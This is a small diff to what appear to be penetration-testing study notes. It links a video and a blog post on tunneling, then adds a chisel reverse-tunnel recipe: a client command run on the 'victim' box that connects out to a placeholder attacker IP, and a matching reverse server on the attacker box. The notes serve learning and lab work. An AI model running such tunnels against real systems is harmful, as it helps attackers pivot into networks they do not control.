@@ -33,3 +33,8 @@ https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1620&ab_channel=IppSec
 Breakdown
 
 https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
+
+```
+Victims Box: ./chisel client <attackersIP>:8011 R:1234:127.0.0.1:1234
+Attackers Box: ./chisel server -p 8011 --reverse
+```
